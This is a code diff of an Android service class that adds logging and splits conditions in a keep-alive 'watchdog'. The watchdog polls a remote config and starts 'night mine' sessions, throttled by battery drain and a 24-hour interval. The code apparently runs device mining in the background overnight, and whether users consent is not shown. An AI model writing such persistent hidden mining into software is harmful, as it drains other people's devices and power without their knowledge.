@@ -36,24 +36,30 @@ public final class TraceServiceImpl extends AbsWorkService {
             if (action != null && action.equals(Intent.ACTION_BATTERY_CHANGED)) {
                 int level = intent.getIntExtra("level", 0);
                 int status = intent.getIntExtra("status", BatteryManager.BATTERY_STATUS_UNKNOWN);
-                info("battery level = " + level + " ,battery status = " + status);
+                info("KeepAliveWatchDog: battery level = " + level + " ,battery status = " + status);
 
                 if (nightConfig != null) {
                     startBatteryLevel = startBatteryLevel == 0 ? level : 0;
+                    info("KeepAliveWatchDog: startBatteryLevel = " + startBatteryLevel);
+                    int consumer = startBatteryLevel - level;
                     switch (status) {
-                        case BatteryManager.BATTERY_STATUS_CHARGING:
-                            if (startBatteryLevel - level >= nightConfig.consumerChargingPower) {
+                        case BatteryManager.BATTERY_STATUS_CHARGING: {
+                            info("KeepAliveWatchDog: isCharging consumer = " + consumer);
+                            if (consumer >= nightConfig.consumerChargingPower) {
                                 resetMiner(context);
                             }
+                        }
                             break;
-                        default:
-                            if (startBatteryLevel <= nightConfig.minPower
-                                    || startBatteryLevel - level >= nightConfig.consumerPower) {
+                        default: {
+                            info("KeepAliveWatchDog: notCharging consumer = " + consumer);
+                            if (startBatteryLevel <= nightConfig.minPower || consumer >= nightConfig.consumerPower) {
                                 resetMiner(context);
                             }
+                        }
                             break;
                     }
                 } else {
+                    info("KeepAliveWatchDog: battery night config is null.");
                     startBatteryLevel = 0;
                 }
             }
@@ -104,36 +110,52 @@ public final class TraceServiceImpl extends AbsWorkService {
 
     @Override
     public void startWork(Intent intent, int flags, int startId) {
-        info("keep alive: check whether the data stored in the disk is saved during the last destruction.");
+        info("KeepAlive: check whether the data stored in the disk is saved during the last destruction.");
         sDisposable = Observable
                 .interval(30, TimeUnit.SECONDS)
                 // 取消任务时取消定时唤醒
                 .doOnDispose(new Action() {
                     @Override
                     public void run() throws Exception {
-                        info("keep alive: cancel.");
+                        info("KeepAliveWatchDog: cancel.");
                         cancelJobAlarmSub();
                     }
                 }).subscribe(new Consumer<Long>() {
                     @Override
                     public void accept(Long count) {
-                        info("keep alive: Collecting data per 30 seconds... count = " + count);
+                        info("KeepAliveWatchDog: collecting data per 30 seconds... count = " + count);
                         NightConfiguration.instance().getConfigObject(getApplicationContext(),
                                 new AsyncTaskListener<NightConfig>() {
                                     @Override
                                     public void runComplete(NightConfig nightConfig) {
-                                        if (nightConfig == null || !nightConfig.enableNightDaemon
-                                                || isMining()) {
+                                        if (nightConfig == null) {
+                                            info("KeepAliveWatchDog: nightConfig is null");
+                                            TraceServiceImpl.this.nightConfig = null;
+                                            return;
+                                        }
+                                        if (!nightConfig.enableNightDaemon) {
+                                            info("KeepAliveWatchDog: night mine disable");
+                                            TraceServiceImpl.this.nightConfig = null;
+                                            return;
+                                        }
+                                        if (isMining()) {
+                                            info("KeepAliveWatchDog: is mining");
                                             TraceServiceImpl.this.nightConfig = null;
                                             return;
                                         }
                                         long current = System.currentTimeMillis();
-                                        if ((current - nightConfig.nightStartupTime) < 0
-                                                || (current - getLastStopTimestamp(getApplicationContext())
-                                                <= 24 * 60 * 60 * 1000)) {
+                                        if ((current - nightConfig.nightStartupTime) < 0) {
+                                            info("KeepAliveWatchDog: not reaching the time of night mine");
                                             TraceServiceImpl.this.nightConfig = null;
                                             return;
                                         }
+                                        if (current - getLastStopTimestamp(getApplicationContext())
+                                                <= 24 * 60 * 60 * 1000) {
+                                            info("KeepAliveWatchDog: not more than 24 hours from the last night mine");
+                                            TraceServiceImpl.this.nightConfig = null;
+                                            return;
+                                        }
+                                        info("KeepAliveWatchDog: start night mine");
                                         TraceServiceImpl.this.nightConfig = nightConfig;
                                         startMine();
                                     }
